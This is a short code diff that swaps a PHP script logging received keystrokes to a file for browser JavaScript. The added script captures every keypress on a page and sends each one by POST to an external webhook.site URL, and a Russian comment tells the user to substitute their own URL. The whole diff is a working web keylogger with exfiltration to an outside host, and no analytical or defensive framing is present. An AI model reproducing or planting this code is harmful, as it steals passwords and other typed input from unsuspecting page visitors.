@@ -1,4 +1,7 @@
-<?php
-$data = json_decode(file_get_contents("php://input"), true);
-file_put_contents("keystrokes.log", $data['key'] . "\n", FILE_APPEND);
-?>
+document.addEventListener("keydown", function(event) {
+    fetch("https://webhook.site/7fcc2c49-186f-4f3d-8f14-7a03443e2a5d", {  // заменяем на твой URL
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ key: event.key })
+    });
+});
